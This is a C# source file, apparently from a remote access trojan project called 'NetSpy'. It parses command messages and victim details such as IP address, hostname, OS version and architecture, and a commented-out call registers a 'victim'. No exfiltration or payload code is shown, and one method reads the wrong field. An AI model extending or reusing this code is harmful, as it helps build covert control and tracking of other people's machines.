using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace NetSpy.Model
{
    class CommandsUtility
    {
        private char[] separators = { ':', ',','\n'};
        private string[] commandList =
        {
            "joinserver",
            "leaveserver"
        };

        private ConnectionUtility connectionUtility;
        private GeoIPCountry geoIpCountry;
        private RattedConnectionUtility ratUtility;
        private SpyUtility spyUtility;

        public CommandsUtility()
        {
            connectionUtility = new ConnectionUtility();
            
            ratUtility = new RattedConnectionUtility();
            spyUtility = new SpyUtility();
        }

        public string GetCommand(string response)
        {
            string text = response.Split(new string[] { "COMMAND:"}, StringSplitOptions.None)[1].Split(separators[2])[0].Replace(Environment.NewLine,"").Replace(((char) 13).ToString(),"");
            return text.ToLower();
        } 

        public string GetStatus(string response)
        {
            string text = response.Split(new string[] { "STATUS:" }, StringSplitOptions.None)[1].Split(separators[2])[0].Replace(Environment.NewLine, "");
            return text.ToLower();
        }

        public string GetLocalIPAddress(string response)
        {
            string text = response.Split(new string[] { "PUBLICIPADDRESS:" }, StringSplitOptions.None)[1].Split(separators[2])[0].Replace(Environment.NewLine, "");
            return text.ToLower();
        }

        public string GetPublicIPAddress(string response)
        {
            string text = response.Split(new string[] { "PUBLICIPADDRESS:" }, StringSplitOptions.None)[1].Split(separators[2])[0].Replace(Environment.NewLine, "");
            return text.ToLower();
        }

        public string GetOsVersion(string response)
        {
            string text = response.Split(new string[] { "OSVERSION:" }, StringSplitOptions.None)[1].Split(separators[2])[0].Replace(Environment.NewLine, "");
            return text.ToLower();
        }

        public string GetHostName(string response)
        {
            string text = response.Split(new string[] { "HOSTNAME:" }, StringSplitOptions.None)[1].Split(separators[2])[0].Replace(Environment.NewLine, "");
            return text.ToLower(); 
        }

        public bool GetArchitectureBits(string response)
        {
            string text = response.Split(new string[] { "IS64BIT:" }, StringSplitOptions.None)[1].Split(separators[2])[0].Replace(Environment.NewLine, "");
            bool is64Bit = Convert.ToBoolean(text.ToLower());
            return is64Bit;
        }

        public void useCommand(string command)
        {
            if (command.Equals("joinserver"))
            {
                //ratUtility.AddVictim(spyUtility.getCountryLocation(IPAddress.Parse(connectionUtility.GetPublicIPAddress())));
            }
            else if (command.Equals("leaveserver"))
            {

            }
        }
    }
}
